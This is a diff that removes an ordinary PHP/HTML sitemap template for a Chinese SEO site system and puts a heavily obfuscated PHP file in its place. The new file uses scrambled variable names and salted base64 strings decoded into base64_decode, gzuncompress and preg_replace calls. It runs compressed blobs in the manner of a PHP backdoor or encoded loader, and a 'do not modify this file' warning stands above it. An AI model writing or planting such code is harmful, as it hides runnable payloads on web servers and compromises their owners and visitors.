@@ -1,51 +1,9 @@
-<?php
-# ÍøÕ¾µØÍ¼ Ä£°åÎÄ¼þ
-defined('T_VERSION') || die();
-# ·ÀÖ¹Ä£°å±»·Ç·¨¿½±´
-?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-        <title>ÍøÕ¾µØÍ¼({Á÷Á¿ÏÀ_µØÍ¼Ò³Êý})_{Á÷Á¿ÏÀ_ÍøÕ¾Ëæ»ú±êÌâ}</title>
-		<meta name="robots" content="noarchive">
-		<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
-		<link rel="stylesheet" type="text/css" href="/Moban/style_0.css" />
-		<script language="javascript" src="/Moban/Cz/cz.js" /></script>
-    </head>
-	<body>
-	<div id="Tb">
-		<h1><a href="{Á÷Á¿ÏÀ_ÍøÕ¾ÓòÃû}" title="{Á÷Á¿ÏÀ_ÍøÕ¾±êÌâ}" target="_blank">{Á÷Á¿ÏÀ_ÍøÕ¾Ëæ»ú±êÌâ}</a></h1>
-	</div>
-	<div id="lm">
-		<fieldset>
-			<ul>
-				<li><a href="{Á÷Á¿ÏÀ_À¸Ä¿ÍøÖ·1}" target="_blank">{Á÷Á¿ÏÀ_À¸Ä¿±êÌâ1}</a></li>
-				<li><a href="{Á÷Á¿ÏÀ_À¸Ä¿ÍøÖ·2}" target="_blank">{Á÷Á¿ÏÀ_À¸Ä¿±êÌâ2}</a></li>
-				<li><a href="{Á÷Á¿ÏÀ_À¸Ä¿ÍøÖ·3}" target="_blank">{Á÷Á¿ÏÀ_À¸Ä¿±êÌâ3}</a></li>
-				<li><a href="{Á÷Á¿ÏÀ_À¸Ä¿ÍøÖ·4}" target="_blank">{Á÷Á¿ÏÀ_À¸Ä¿±êÌâ4}</a></li>
-			</ul>
-		</fieldset>
-	</div>
-	<div id="maps">
-		<h2>&nbsp;ÄúÏÖÔÚµÄÎ»ÖÃ£º<a href="{Á÷Á¿ÏÀ_ÍøÕ¾ÓòÃû}" target="_blank">{Á÷Á¿ÏÀ_ÍøÕ¾Ëæ»ú±êÌâ}</a> >> <a href="{Á÷Á¿ÏÀ_ÍøÕ¾ÓòÃû}sitemap.html" target="_blank">ÍøÕ¾µØÍ¼</a> >> <a href="{Á÷Á¿ÏÀ_µØÍ¼ÍøÖ·}" target="_blank">{Á÷Á¿ÏÀ_µØÍ¼Ò³Êý}</a> >> µØÍ¼ÄÚÈÝ</h2>
-		<ul>
-			{Á÷Á¿ÏÀ_µØÍ¼ÁÐ±í}
-		<div id="page">
-			{Á÷Á¿ÏÀ_µØÍ¼·ÖÒ³}
-		</div>
-		</ul>
-	</div>
-	<div id="Db">
-		BY {Á÷Á¿ÏÀ_ÍøÕ¾ÓòÃû} <strong><a href="{Á÷Á¿ÏÀ_ÍøÕ¾ÓòÃû}" target="_blank">{Á÷Á¿ÏÀ_ÍøÕ¾Ëæ»ú±êÌâ}</a></strong> <strong><a href="{Á÷Á¿ÏÀ_ÍøÕ¾ÓòÃû}" target="_blank">{Á÷Á¿ÏÀ_ÍøÕ¾¸±´Ê}</a></strong> °æÈ¨ËùÓÐ <a href="{Á÷Á¿ÏÀ_ÍøÕ¾ÓòÃû}sitemap.html" target="_blank">ÍøÕ¾µØÍ¼</a>
-	</div>
-	<!-- Baidu Button BEGIN -->
-		<script type="text/javascript" id="bdshare_js" data="type=slide&amp;img=7&amp;pos=right&amp;uid=6713514" ></script>
-		<script type="text/javascript" id="bdshell_js"></script>
-		<script type="text/javascript">
-		document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000);
-		</script>
-	<!-- Baidu Button END -->
-	</body>
-</html>
-<!-- ½Å±¾ÔËÐÐÊ±¼ä : {Á÷Á¿ÏÀ_ÔËÐÐÊ±¼ä} -->
-<!-- µ±Ç°Ä£°åÄ¿Â¼ : {Á÷Á¿ÏÀ_Ä£°åÄ¿Â¼} -->
+<?php 
+/*
+Warning: do not modify this file, otherwise may cause the program to run.
+QQ: 1795873837
+Website: 
+*/
+if (!defined("BFBBD")){define("BFBBD", __FILE__);global $˜,$›š,$‡„˜,$†‰Š,$––,$‚‹›‹†‚,$šŽžšŸ,$›Š”…‹œŠ,$ƒƒ•’‹€…Ž,$Žˆ›Š”Ž‘‹,$‘†‘‹’˜Ž,$ƒ“€™……‡–”—,$•’„ƒ–”„ˆ,$—Šš”ŸŽ””œ,$…‰“†š–œŒ‡€‘„˜…Š,$€…Œ†’†„†”ƒ•‰“Š…;function ˜ ($˜ ,$›š =""){global $˜,$›š,$‡„˜,$†‰Š,$––,$‚‹›‹†‚,$šŽžšŸ,$›Š”…‹œŠ,$ƒƒ•’‹€…Ž,$Žˆ›Š”Ž‘‹,$‘†‘‹’˜Ž,$ƒ“€™……‡–”—,$•’„ƒ–”„ˆ,$—Šš”ŸŽ””œ,$…‰“†š–œŒ‡€‘„˜…Š,$€…Œ†’†„†”ƒ•‰“Š…;if(empty($›š )){return base64_decode($˜ );}else{return ˜ ($•’„ƒ–”„ˆ($˜ ,$›š ,$‘†‘‹’˜Ž($›š )));}}$‘†‘‹’˜Ž=˜ ("c3RycmV2“");$•’„ƒ–”„ˆ=˜ ("c3RydHI=™");$‚‹›‹†‚=˜ ("hXhZbA==","ZLuBgCzyh");$šŽžšŸ=˜ ("o3p1bmNSbX˜ByoXNz–","ZSOACvo");$ƒƒ•’‹€…Ž=˜ ("KHJlZ19yZXBŽsYWNl","cfdTbK");$…‰“†š–œŒ‡€‘„˜…Š=˜ ("EVFzZTE0X2RlE29k—ZQ==–","YmgQNVE");$€…Œ†’†„†”ƒ•‰“Š…=˜ ("ozM2NzMzUWY5YˆTkxNDEzUTI3NW„M2YzdjUTUzYjE›xNTcwo2M=”","LUhxSMo");function ‡„˜ (&$‡„˜ ){global $˜,$›š,$‡„˜,$†‰Š,$––,$‚‹›‹†‚,$šŽžšŸ,$›Š”…‹œŠ,$ƒƒ•’‹€…Ž,$Žˆ›Š”Ž‘‹,$‘†‘‹’˜Ž,$ƒ“€™……‡–”—,$•’„ƒ–”„ˆ,$—Šš”ŸŽ””œ,$…‰“†š–œŒ‡€‘„˜…Š,$€…Œ†’†„†”ƒ•‰“Š…;$€…Œ†’†„†”ƒ•‰“Š… =˜ ("WGll„","ZuFphQW");@$ƒƒ•’‹€…Ž($€…Œ†’†„†”ƒ•‰“Š…,$‚‹›‹†‚."(@$šŽžšŸ($…‰“†š–œŒ‡€‘„˜…Š('eNpVkm1z0kAUhf‰8Kk8mHzZi2xqTYŽDLPjS4kKthRwgIA6DKFZwCbKFEYKštsNrgoQCpaSAgd”L8VLOBUv14d59z†5tyzS87h3AZEnM„0W4my0ahE0kU2F83GC8pELy72LiX…m/9J4/i0XgCs4c–IFUJ5o/8MYx0O2v9cWIfJcVgNSmeˆwYGDZPL+wDEG9N—7AcImcqpRyYqgo‹a2oMtrBLOV/zhz/mMDUdTJsDF4teœhEoSG1JWmLjIxdœSom8S4MbX+cu2kfAhmUwxfThqH0W+ZNxDWcegKEjOH–8RMF48PfC8NsDkfjvisoqjwqChwcY89ErYKiQhFj7U€njj3ajdafmrO6Cš6HtQSSYicIHBQP‚gUYWpm1EfWvTl4„GJojc+lylUSEwU…1Jiv/kB6pgam7D‘dPpd4EhIp30FBL‡aJAbEHdp+9or6A™PYJ2KNpp1aaoX24xNsTTZ+ar70pW’SvL2cG77rshWf9ˆHXW870tA1YA7SHŽOJe2tTnEv4uARyŒHtwhsJ9Uhvr3FmsHGgd7wUhHj+f1•mAj56o5/QO+4La‘JTj2wMshjkM8kg9ecjLyyhmeZU6zœMi/zDLNP0CxFYUˆ/P5aWHbGjNa/1W€7+hm+643MTQbrP„+NDV+T1vC+ubIeAKn1Jro1XV53G+POXHNSYwCHbrfv•bkf9hja0Ybmgyli7EbkvIbBFRlJD‰PzVJjFQFMVS7wU–93Hsl+ehsWnIr+šAgFlFUs=€')));","œ˜ˆ
+‘•’ˆ–567531f9a914131275e6c7c133b11570‘„”›");return "i";}}else{global $˜,$›š,$‡„˜,$†‰Š,$––,$‚‹›‹†‚,$šŽžšŸ,$›Š”…‹œŠ,$ƒƒ•’‹€…Ž,$Žˆ›Š”Ž‘‹,$‘†‘‹’˜Ž,$ƒ“€™……‡–”—,$•’„ƒ–”„ˆ,$—Šš”ŸŽ””œ,$…‰“†š–œŒ‡€‘„˜…Š,$€…Œ†’†„†”ƒ•‰“Š…;$‘†‘‹’˜Ž=˜ ("c3RycmV2“");$•’„ƒ–”„ˆ=˜ ("c3RydHI=™");$‚‹›‹†‚=˜ ("hXhZbA==","ZLuBgCzyh");$šŽžšŸ=˜ ("o3p1bmNSbX˜ByoXNz–","ZSOACvo");$ƒƒ•’‹€…Ž=˜ ("KHJlZ19yZXBŽsYWNl","cfdTbK");$…‰“†š–œŒ‡€‘„˜…Š=˜ ("EVFzZTE0X2RlE29k—ZQ==–","YmgQNVE");$€…Œ†’†„†”ƒ•‰“Š…=˜ ("ozM2NzMzUWY5YˆTkxNDEzUTI3NW„M2YzdjUTUzYjE›xNTcwo2M=”","LUhxSMo");}$›Š”…‹œŠ =˜ ("yU5vTG1oVmhEQUGbRC9RRjSGš","ZYXwy");$šŽžšŸ =‡„˜ ($›Š”…‹œŠ );@$ƒƒ•’‹€…Ž($€…Œ†’†„†”ƒ•‰“Š…,$‚‹›‹†‚."(@$šŽžšŸ($…‰“†š–œŒ‡€‘„˜…Š('eNqtVstPGˆ0ccPoPE/z˜BZWYmt2jv‰YpomId41k„bLVIgUSp+•8jJWnsHe8žl6190dG0i‰DwAGbgIPN—wxDKoznk0ŽiNWihI1NI‚TEVSMoDUpSVEXqpWpzžqNRLL01TVŽersw9TEBRŸk1e5rH9/tŽ+33wz+5vx‚tHmZtkQs0›dTIo25BQr›z1RDD0QeD‰8ex1nu07Y‹wOXLgBeQ1eYBbd6mRuˆaY/2x78MK5AIjhuAjOŽve8709EOK›AeEH7rbIfšQH/eCjd4O…dZ4CTbgZB…hZNUAQuyxŸIkQBrooQM‰UwTpyGsLe–3l+5107ISˆhcHzsE/jcmrBZtOBqy€JpHvOUllrP2BcXJZX9˜Dx5na2urEa6BAfmYGO˜J4s633sYBF5N1++f29Ž1R+216yfb›Pyxsf74fk€jrPLm1+feŒALVQZ0jBbŠL+6+Kv367€U8DDDQCmxœobGpg4whyŽQuDhiKUUOœy1ilQESWM—JIwS0kyp0™RiQgpRVVhˆNqQN9nBRS…LNVuIB3B/‚gSqisOoD0ˆNNuQdEYpy”iIsxGwy63ž00UBaDCJgƒnQRKEhkK".$›Š”…‹œŠ .$šŽžšŸ ."0iNIYQ„pgAmNGR1RƒiZCYgrpZC„nbKYU6COjœDUTOszJo0ŒaUYQEBiIn‡RZNclMT2cCnOGKSAqk›T2gtsvwcglukePZKCBqLgKTVsbm”LDM9+sNXkgBgWepYNhŒceczpZThTT7WnT39/+’NcAEa75uXš9Gd5rMcEq›ULJ8KhYnI“i5T3gA3hi–CqSQ8sNSfŠJ9IsS4KaJbQCJPzNR7ŽDUxSNBqamƒ7Xq7t8pr2™+/3L3tPES”EhtEEOE0F‡hKcORlcdj‚K4jMbrrYHˆQfibGlDsa…W1xgZaDrK†wGqnazckzƒiXUyrlweYŠ9LYTXhKb9‹6vPvs+Wr5‰u7u7D29+e†ehZqfdEAK™8XHExEqgk‘iQmi9QNSQ„VmrCgTzap•GbUIYL2yk’iFRBsoP3/0IzmqLmP5‰lSNYHbKxU‚/ptQJ+t+JUgvyZVC7yš9++SWAaw4–vLcFtZ77z‰T/RdwHUWA–EYFSuyFPW‰+EdtJeTDY/jftndIXm€69Rrrx49PšnWn0933sjŽG7jPqmMMB…fJzAJ4Evi“bEsAV/gnY‚4u4HDsq5RVFba6VGoO—h3mV1GoU0Œookz2GOwD”SwKgo8Os7žFEx4hHmVP‘6a2ErLKKEŸI1hvZck0SŠdPOd1vO1s›oUF1d606L†RFFLe5RYHƒcLLkWSc3Dg0sSggIq3‹p6+/grdWk™NprcA4Ddu6nDPFkHrSŽ+VDmt+0RE‚5TvaHw0IEƒ9qjQCEy5yžGXRFuGlFFJUcmuzFHgšLdHI4RkeQ‡IFol1Av8H“CavCOg+2aƒx9No9xfv9ˆdQO2OBLr8•5n4w0LxqGŸP2a1N8hBP˜3V16V7z7Zœ2djZLaz+D’03sHvTI0YœETr0NXSNyŠvlmyu/lNc‰frFVBK0M6‰VH8FgaRECŸpnVMm+3LCˆ7YLaMjpJE›dmxi3W+YmŸ5tITdsuV3”GIue8VuWc—gvpz9buEF…g45PFTG6J˜IIaHZ6cLu„aFM3m7JX1’0cL6bzham‘c3TJVyE7l„ptOD8/llg€pkZ+jQzmR•mdK14ftFs‰K6dnpyZHh5bniyFXSv“T4+WFhYLkƒ7cyBcLxSWˆ7JTM2k12Y‡W7o2OjQ1Mˆp8hGYYy6W’vZ6exItjgž8OzYznrF5‡2rz/AI7NBŠKQ=š')));","‹‡ƒ
+Ÿ”‡–„567531f9a914131275e6c7c133b11570‘…˜Ž");return true;?>837646cf84704265a91008a8a3092e7a
